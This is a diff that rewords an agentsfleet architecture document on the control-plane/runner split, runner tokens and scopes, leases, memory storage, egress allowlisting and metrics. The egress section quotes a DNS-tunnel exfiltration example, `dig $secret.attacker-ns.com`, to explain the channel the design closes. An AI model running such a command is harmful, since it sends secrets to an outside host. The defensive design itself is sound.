@@ -3,7 +3,7 @@
 > Parent: [`README.md`](./README.md) · Sibling: [`data_flow.md`](./data_flow.md) (how one event flows through this split). · User-facing: [docs.agentsfleet.net/runners](https://docs.agentsfleet.net/runners).
 
 > [!IMPORTANT]
-> **Implemented (M80_002 cutover).** This is the runtime the codebase runs now, with `agentsfleetd` as the control plane and the host-resident `agentsfleet-runner` daemon as the execution plane. The old single-process `agentsfleetd worker` and the standalone sandbox sidecar are deleted.
+> **Implemented (M80_002 cutover)**. This is the runtime the codebase runs now, with `agentsfleetd` as the control plane and the host-resident `agentsfleet-runner` daemon as the execution plane. The old single-process `agentsfleetd worker` and the standalone sandbox sidecar are deleted.
 
 [`data_flow.md`](./data_flow.md) traces an event through it; this file is the structural picture.
 
@@ -197,11 +197,11 @@ If the platform ever needs a true control plane, that is a larger upfront conver
 
 ## Why split
 
-The pre-cutover runtime ran one `agentsfleetd` binary as `serve` (the HTTP API) or `worker` (the coordination loop), plus a standalone sandbox sidecar that owned sandboxing. Two facts made it impossible to run work on hosts the platform does not fully own:
+The pre-cutover runtime ran one `agentsfleetd` binary as `serve` (the HTTP API) or `worker` (the coordination loop). The runtime also ran a standalone sandbox sidecar that owned sandboxing. Two facts made it impossible to run work on hosts the platform does not fully own:
 
 1. **The worker was welded to the datastores.** Each per-fleet worker thread opened its own Postgres pool and datastore connections. It ran about 15 write patterns on the per-event hot path and found its own work by `XREADGROUP` on `fleet:{id}:events`. It could not run anywhere it could not reach both datastores directly.
 
-2. **The connection budget grew with the fleet.** Every per-fleet thread held a dedicated blocking datastore connection, so the connection pool ceiling capped the fleet count, not compute.
+2. **The connection budget grew with the fleet**. Every per-fleet thread held a dedicated blocking datastore connection, so the connection pool ceiling capped the fleet count, not compute.
 
 The cutover moved execution onto arbitrary hosts (bare metal, a Mac, a pod) that hold **no datastore credentials**. They reach the platform only over the authenticated `/v1/runners` protocol.
 
@@ -217,7 +217,7 @@ The BEFORE/NOW split diagram is front-loaded in §Topology.
 
 Neither may sit where a tenant program runs. So the supervisor runs outside every sandbox, and a sandbox runs tool calls and nothing else, over one Unix socket per lease.
 
-The sandbox is the same binary's `sandbox` entry, bound read-only into it, so there is no second binary to deploy ([Runner execution](./runner_execution.md) §Process model).
+The sandbox is the same binary's `sandbox` entry, bound read-only into it. There is no second binary to deploy ([Runner execution](./runner_execution.md) §Process model).
 
 ### Where the code lives
 
@@ -235,7 +235,9 @@ The shape that matters here has one enrolment route, `POST /v1/runners`, called 
 
 `me` resolves from the token. No `runner_id` appears in any path or body, so there is nothing to spoof or reconcile. `register` is the one verb authed by a *human operator* credential; everything else is authed by the machine credential it mints.
 
-Identity and auth are covered in [`../AUTH.md`](../AUTH.md); the runner is the first machine principal. `register` is gated by the `runner:enroll` scope, grantable on its own, because enrolling a host into the shared fleet exposes every tenant's secrets to it. A token without that scope is rejected `403`, tenant `admin` JWT and `agt_t` api_key alike.
+Identity and auth are covered in [`../AUTH.md`](../AUTH.md); the runner is the first machine principal. `register` is gated by the `runner:enroll` scope. The scope is grantable on its own, because enrolling a host into the shared fleet exposes every tenant's secrets to it.
+
+A token without that scope is rejected `403`, tenant `admin` JWT and `agt_t` api_key alike.
 
 ### The held heartbeat
 
@@ -285,7 +287,9 @@ There is no enrollment token; the minter must hold `runner:enroll`. The open-fle
    |      eligibility: assigned tier + scope + secret_delivery   GATE 3 - blast radius
 ```
 
-`agentsfleetd` owns the Postgres pool, the Dragonfly pool, and the Vault API; `agentsfleet-runner` owns none of them and holds only the `agt_r` token. A platform operator holding `runner:write` rotates it with `PATCH /v1/fleets/runners/{id} {"action":"rotate"}`. The write swaps `token_hash` and appends an actor-attributed event atomically, returns the replacement token once, and makes the old token fail the next auth read.
+`agentsfleetd` owns the Postgres pool, the Dragonfly pool, and the Vault API. `agentsfleet-runner` owns none of them and holds only the `agt_r` token. A platform operator holding `runner:write` rotates it with `PATCH /v1/fleets/runners/{id} {"action":"rotate"}`.
+
+The write swaps `token_hash` and appends an actor-attributed event atomically. The write returns the replacement token once, and makes the old token fail the next auth read.
 
 Revoking instead sets `status='revoked'` (M84_002) so every later call gets a 401. The runner's complete environment is `AGENTSFLEET_API_URL` plus `AGENTSFLEET_RUNNER_TOKEN`, with the optional host-local `RUNNER_STORAGE_HOME`. There is no bootstrap credential on the host, no datastore secret, and **no policy in the environment** (M148; §Assigned policy and reconciliation).
 
@@ -355,7 +359,9 @@ Kubernetes needs `status.conditions[]` because dozens of controllers write ortho
 
 Liveness is honest because **mint stores `last_seen_at = 0`** (the never-connected sentinel). A freshly-minted runner reads **registered**, not a fake **online**, until its first heartbeat moves `last_seen_at` forward (M84_001).
 
-"Auth failed" is *not* a runner state. Identity is the token, so a bad `agt_r` matches no row; it surfaces in logs and metrics, never as a row's liveness. A Kubernetes-style `status` plus `conditions` JSONB split is adopted **only if** many independent subsystems ever write runner conditions (health probes, maintenance, capacity, security), not before.
+"Auth failed" is *not* a runner state. Identity is the token, so a bad `agt_r` matches no row. The failure surfaces in logs and metrics, never as a row's liveness.
+
+A Kubernetes-style `status` plus `conditions` JSONB split is adopted **only if** many independent subsystems ever write runner conditions. Examples are health probes, maintenance, capacity and security. Until then, it is not adopted.
 
 ### Operator plane + reassignment
 
@@ -456,9 +462,9 @@ Three load-bearing facts:
 
 1. **The runner never authenticates to Postgres.** It holds zero datastore credentials and reaches the platform only over `/v1/runners`. `agentsfleetd` writes every `runner.*` row *on the runner's behalf*, connecting as `api_runtime`. The runner schema slots grant those tables to `api_runtime` only. They never mention `worker_runtime`, dead substrate removed wholesale in the worker-substrate retirement workstream.
 
-2. **`runner:enroll` is not a Postgres role; it is a token scope.** "Whoever may enroll has access to the runner tables" is an *API-authorization* statement, already satisfied at Layer 1 (it gates `register` and the fleet-management routes). It is not, and must not become, a database `GRANT`.
+2. **`runner:enroll` is not a Postgres role; it is a token scope**. "Whoever may enroll has access to the runner tables" is an *API-authorization* statement, already satisfied at Layer 1. Layer 1 gates `register` and the fleet-management routes. It is not, and must not become, a database `GRANT`.
 
-3. **Therefore there is no `runner_runtime` role, and there must never be one.** A `runner_*`-named datastore role would assert that the runner connects to the datastore, exactly the guarantee this fleet is built to deny. An in-PR `worker_runtime` to `runner_runtime` rename was rejected for this reason; removal, not rename, is the correct direction.
+3. **Therefore there is no `runner_runtime` role, and there must never be one**. A `runner_*`-named datastore role would assert that the runner connects to the datastore. That is exactly the guarantee this fleet is built to deny. An in-PR `worker_runtime` to `runner_runtime` rename was rejected for this reason; removal, not rename, is the correct direction.
 
 If connection-level isolation of the fleet write path is ever warranted, that is a **control-plane** role. Name it `fleet_runtime` and back it with its own pool.
 
@@ -495,7 +501,9 @@ A failed transaction leaves the lease active and unsettled. A lost response is r
 
 Activity publication and outbound dispatch follow the commit. See [`data_flow.md`](./data_flow.md) §`C. EXECUTE`.
 
-The durable lease guard lives in `agentsfleetd` via `lease_expires_at` and `fencing_token` (see **Reclaim** below). On the runner, each lease is one task that owns its sandbox. A sandbox is held or destroyed exactly once, and the engine's boot sweep removes what a crashed runner left ([Runner execution](./runner_execution.md) §"A lease's sandbox today").
+The durable lease guard lives in `agentsfleetd` via `lease_expires_at` and `fencing_token` (see **Reclaim** below). On the runner, each lease is one task that owns its sandbox.
+
+A sandbox is held or destroyed exactly once. The engine's boot sweep removes what a crashed runner left ([Runner execution](./runner_execution.md) §"A lease's sandbox today").
 
 ### Process-boundary hardening
 
@@ -518,7 +526,9 @@ Postgres is the only store built: `afd_memory::PgStore`, behind `afd_memory::Mem
 
 Memory carries the fleet's learned knowledge: the `memory_store` / `memory_recall` durable scratchpad. It is loaded into a run and captured out of it, and is never runner-local-durable.
 
-The memory tools run in the supervisor, so a sandbox holds **no** `agt_r` token, **no** control-plane URL, **no** Data Source Name (DSN) and no memory. A prompt-injected fleet cannot be talked into "reach your memory endpoint", because none exists inside it. The run's working store is `afr_memory::Hydrated`, in the supervisor's memory, with no on-disk file.
+The memory tools run in the supervisor. A sandbox therefore holds **no** `agt_r` token, **no** control-plane URL, **no** Data Source Name (DSN) and no memory. A prompt-injected fleet cannot be talked into "reach your memory endpoint", because none exists inside it.
+
+The run's working store is `afr_memory::Hydrated`, in the supervisor's memory, with no on-disk file.
 
 Durability is the supervisor's job, over the same `agt_r` `/v1/runners` plane that already carries leases and reports. Two fencing-verified routes carry it, `hydrate` and `capture` under `/v1/runners/me/memory/{fleet_id}`, plus a capped recall (API reference › Runner plane).
 
@@ -593,7 +603,7 @@ The decided workspace scope (§"Memory backends and scope") gives one workspace 
 
 **Cadence.** The supervisor pushes at **run end** (mandatory) and **mid-run** on the existing `memory_checkpoint_every` cadence.
 
-A long run's learned memory is so durable before the run finishes, and a crash loses at most the work since the last checkpoint push. Because the run-end push lands before `report`, the fleet's next run loads the snapshot the previous run just stored.
+A long run's learned memory is so durable before the run finishes. A crash loses at most the work since the last checkpoint push. Because the run-end push lands before `report`, the fleet's next run loads the snapshot the previous run just stored.
 
 **Selection policy.** The loaded window is a deterministic, category-pinned byte window, a pure function of (rows, budget).
 
@@ -603,7 +613,9 @@ Unknown and custom categories are windowed, never silently pinned. Cap eviction 
 
 The coldest non-core rows are evicted first, and a `core` row is evicted only when no non-core row remains. A fact stored once as `core` so survives both the window and the cap.
 
-No search infrastructure, no scoring. The fleet's own discipline is the primary bound: stable keys, `core` for load-bearing facts, `memory_forget` for stale entries (see [*capabilities.md*](./capabilities.md) §4 memory hygiene). A dedicated, scalable memory store remains the post-launch direction; the `GET` endpoint is the seam it swaps in behind, with no change to the fleet.
+No search infrastructure, no scoring. The fleet's own discipline is the primary bound: stable keys, `core` for load-bearing facts, `memory_forget` for stale entries. See [*capabilities.md*](./capabilities.md) §4 memory hygiene.
+
+A dedicated, scalable memory store remains the post-launch direction. The `GET` endpoint is the seam it swaps in behind, with no change to the fleet.
 
 ### Memory backends and scope (decided 2026-10-03; built)
 
@@ -619,7 +631,7 @@ Two decisions by Indy on 2026-10-03, after the options below were weighed.
 | B · runner direct | the runner | a long-lived store key on every lease | none for a vendor |
 | C · hybrid (chosen first, replaced) | the runner | a short-lived key scoped to one namespace | one mint per lease for a vendor |
 
-**Why through `agentsfleetd`.** A flip that migrates memory means `agentsfleetd` reads and writes every store anyway. With one owner, the two scopes, the workspace-scope access control and the record of which fleet wrote an entry hold the same on every store.
+**Why through `agentsfleetd`.** A flip that migrates memory means `agentsfleetd` reads and writes every store anyway. With one owner, the two scopes and the workspace-scope access control hold the same on every store. So does the record of which fleet wrote an entry.
 
 That holds whatever a vendor's keys can scope. The runner keeps holding no store credential.
 
@@ -669,7 +681,7 @@ Every call ends exactly once. When a run ends for any reason, the runner emits `
 
 The run's trace rides the report, up to 200 calls and 64 KiB. Past the byte cap a call keeps its row without output edges, and past 200 calls it is counted as omitted.
 
-`agentsfleetd` parses the trace after the report's own fields, checks its bounds, and rewrites each call id to the fenced `{fence}:{n}` the live frames use. It writes the trace to `fleet.events.tool_calls` in the statement that writes the reply, so a fenced-out report writes neither.
+`agentsfleetd` parses the trace after the report's own fields and checks its bounds. `agentsfleetd` rewrites each call id to the fenced `{fence}:{n}` the live frames use. It writes the trace to `fleet.events.tool_calls` in the statement that writes the reply, so a fenced-out report writes neither.
 
 A trace that is malformed or over a bound is dropped and logged, and the report still settles. The run's outcome must not be lost over its tool list.
 
@@ -735,7 +747,7 @@ All three are decided by `agentsfleetd`, which owns both `fleet.fleets.status` a
 
 Renewal reads the fleet's stored config whatever its status (`afd_fleet`'s lease coverage read). A paused or killed fleet's run so still stops at the fleet's stored budget ceiling.
 
-Each renewal reads that ceiling afresh. A paused or stopped fleet's config can be edited mid-run and the next renewal obeys the edit; a killed fleet's cannot be edited.
+Each renewal reads that ceiling afresh. A paused or stopped fleet's config can be edited mid-run and the next renewal obeys the edit. A killed fleet's config cannot be edited.
 
 - **Steer** — a message to a fleet. The send answers one of three dispositions: `started`, `folded` or `queued`. With no run live and nothing waiting, the message starts a run of its own. While a run is live, the message **folds** into that run. The send answers `folded` with `folded_into_event_id`. The running lease claims it at its next model call through `POST /v1/runners/me/leases/{lease_id}/folds`. A run claims every message its fleet received after its own, oldest first, up to the first parked (approval-gated) or task-bound one. That message is a barrier, and nothing after it folds. The model call in flight is never cut short. When the run reports succeeded, each folded message's own event gets the run's reply. Anything else waits its turn as `queued`. Not an interrupt.
 
@@ -883,7 +895,7 @@ That closes the DNS-tunnel exfiltration channel (`dig $secret.attacker-ns.com @r
 
 A host from the fleet's `network.allow` that resolves to any address `af_core::net::is_blocked` refuses also refuses the lease. Those addresses are loopback, the private ranges, the tailnet's shared range `100.64.0.0/10`, link-local with the cloud metadata service `169.254.169.254`, and everything reserved.
 
-That is the predicate `http_request` and the daemon's endpoint check use, so a host refused at the request layer is refused at the kernel too. The lease ends with "the fleet allows an egress host at a private or reserved address", which the fleet owner fixes.
+That is the predicate `http_request` and the daemon's endpoint check use. A host refused at the request layer is therefore refused at the kernel too. The lease ends with "the fleet allows an egress host at a private or reserved address", which the fleet owner fixes.
 
 The log names the host, never the address. Registry hosts are exempt, because the operator may point them at a mirror on its own network.
 
@@ -901,7 +913,9 @@ The host needs nf_tables in its kernel, `net.ipv4.ip_forward=1`, which the runne
 
 > **The allowlist versus the deferred name layer.** The above is a resolve-at-bind address pin. It has an own namespace, a host-side nf_tables allowlist, no proxy and no resolver in the data path.
 
-> The name layer arrives when the fleet opens to untrusted or customer-operated runners with **rotating-CDN host sets** that a pin at bind cannot track. It is added the **modern** way, as an **eBPF/FQDN-aware datapath**. That datapath learns allowed addresses by snooping DNS *answers* and programs the same kernel set live.
+> The name layer arrives when the fleet opens to untrusted or customer-operated runners. Those runners have **rotating-CDN host sets** that a pin at bind cannot track. The name layer is added the **modern** way, as an **eBPF/FQDN-aware datapath**.
+
+> That datapath learns allowed addresses by snooping DNS *answers* and programs the same kernel set live.
 
 > The model is the Cilium `toFQDNs` pattern, or a minimal DNS-answer watcher updating our existing set. There is **no forward proxy, no SNI/`CONNECT` interception and no TLS man-in-the-middle**; that squid-era approach is explicitly *not* the direction. It evolves the datapath from pin at bind to pin from observed DNS, same set.
 
@@ -957,7 +971,9 @@ The split inverts the binding constraint. The pre-cutover runtime needed N datas
 
 Runners scale out with no coordination. The operator enrolls a host with a pre-minted `agt_r`, and it pulls.
 
-The one piece needing care at multi-replica scale is placement (assignment and scheduling), the M84_002 (reassignment, shipped) and M85_001 (label placement, shipped) concern. The hot path (lease and report) is shardable. See [`scaling.md`](./scaling.md) for the re-derived connection math.
+The one piece needing care at multi-replica scale is placement (assignment and scheduling). Placement is the concern of M84_002 (reassignment, shipped) and M85_001 (label placement, shipped).
+
+The hot path (lease and report) is shardable. See [`scaling.md`](./scaling.md) for the re-derived connection math.
 
 ## Observability — bounded facts to `agentsfleetd`; logs, traces and metrics to a runner collector
 
@@ -985,7 +1001,9 @@ The fleet census publishes unsettled admission count and oldest age.
 Use the maximum across replicas, since each census reads the deployment-wide ledger.
 A failed census withdraws both gauges rather than exporting an old value.
 
-The four per-runner families live in a fixed-capacity (4096-series) table keyed on `runner_id`, held by the daemon in `af_observability`. A lookup takes a read lock, and the counters underneath it are atomics, so recording never blocks another recorder. The OTLP export reads only that in-memory snapshot, **zero Postgres on the export path**, so the export stays healthy exactly when the database is not.
+The four per-runner families live in a fixed-capacity (4096-series) table keyed on `runner_id`, held by the daemon in `af_observability`. A lookup takes a read lock, and the counters underneath it are atomics, so recording never blocks another recorder.
+
+The OTLP export reads only that in-memory snapshot, **zero Postgres on the export path**. The export therefore stays healthy exactly when the database is not.
 
 Cardinality is capped: the 4097th distinct `runner_id` routes to `runner_id="_other"` (counters preserved). Footprint is therefore bounded by that cap regardless of fleet size or uptime. A `agentsfleetd` restart zeroes the table; Prometheus counter-reset semantics absorb it, and gauges self-heal within one heartbeat or lease cycle.
 
@@ -993,7 +1011,9 @@ Cardinality is capped: the 4097th distinct `runner_id` routes to `runner_id="_ot
 
 Prod is sized for **3 `agentsfleetd` machines**. The release workflow sets that count with `flyctl scale` and verifies that all three machines are running before public readiness. The sections below are written for N>1 as the operating shape, not the contingency.
 
-A runner's verbs load-balance across replicas, so each replica holds only the slice of that runner's event stream it served. Each replica exports its own series, identified by the OpenTelemetry resource attribute that carries the machine identity rather than by a scrape target's `instance` label. Fleet-wide truth is so reconstructed by the query, not by shared state:
+A runner's verbs load-balance across replicas. So each replica holds only the slice of that runner's event stream it served. Each replica exports its own series.
+
+The series are identified by the OpenTelemetry resource attribute carrying the machine identity, not by a scrape target's `instance` label. Fleet-wide truth is so reconstructed by the query, not by shared state:
 
 | Series | Cross-replica query | Exact under N>1? |
 |--------|---------------------|------------------|
